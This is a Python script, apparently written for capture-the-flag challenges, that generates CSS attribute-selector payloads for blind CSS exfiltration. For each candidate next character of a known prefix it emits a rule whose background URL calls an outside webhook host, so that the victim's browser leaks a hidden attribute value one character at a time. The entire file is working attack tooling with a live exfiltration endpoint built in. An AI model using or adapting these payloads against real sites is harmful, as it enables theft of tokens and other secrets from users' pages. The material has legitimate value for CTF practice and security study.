#!/usr/bin/env python3
"""CSS attribute-selector brute-force generator for blind CSS exfiltration CTFs.

Usage:
    python3 gen_css.py "flag{e2"          # next char after the known prefix
    python3 gen_css.py "flag{e2" --attr value --base https://webhook.voronyuk.com/umasnh8ct5/w9sdwtft

Watch your webhook log: the path /pos<N>/<label>.jpg that fires = the matched char.
When the firing label is sym-rbrace ( } ), the flag is complete.
"""
import argparse, string

def label(c):
    named = {'_':'underscore','-':'dash','!':'excl','?':'ques','@':'at','#':'hash',
        '$':'dollar','%':'pct','&':'amp','*':'star','+':'plus','=':'eq','.':'dot',
        ',':'comma',':':'colon',';':'semi','/':'slash','\\':'bslash','|':'pipe',
        '~':'tilde','^':'caret','(':'lparen',')':'rparen','[':'lbrack',']':'rbrack',
        '{':'lbrace','}':'rbrace','<':'lt','>':'gt',"'":'squote','"':'dquote',' ':'space'}
    if c in named: return "sym-"+named[c]
    if c.isupper(): return "U-"+c
    return "L-"+c

def css_escape(c):
    return {'"':'\\"','\\':'\\\\'}.get(c, c)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("prefix", help='known so far, e.g. "flag{e2"')
    ap.add_argument("--attr", default="value", help="attribute to match (value, data-x, href...)")
    ap.add_argument("--base", default="https://webhook.voronyuk.com/umasnh8ct5/w9sdwtft")
    ap.add_argument("--charset", default="full", choices=["full","hex","loweralnum"],
                    help="full=a-zA-Z0-9+symbols, hex=0-9a-f, loweralnum=a-z0-9")
    args = ap.parse_args()

    pos = len(args.prefix) - args.prefix.index("{")   # char index inside the braces, 1-based
    if args.charset == "hex":
        cand = list("0123456789abcdef")
    elif args.charset == "loweralnum":
        cand = list(string.ascii_lowercase + string.digits)
    else:
        cand = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + \
               list("_-!?@#$%&*+=.,:;/\\|~^()[]{}<>'\" ")

    out = [f'/* Position {pos} — prefix "{args.prefix}" — attr [{args.attr}] */', '']
    for c in cand:
        sel = f'[{args.attr}^="{args.prefix}{css_escape(c)}"]'
        out.append(f'{sel} {{ background: url("{args.base}/pos{pos}/{label(c)}.jpg"); }}')
    text = "\n".join(out) + "\n"
    fn = f"flag_pos{pos}.css"
    open(fn, "w").write(text)
    print(f"{len(cand)} rules -> {fn}")

if __name__ == "__main__":
    main()
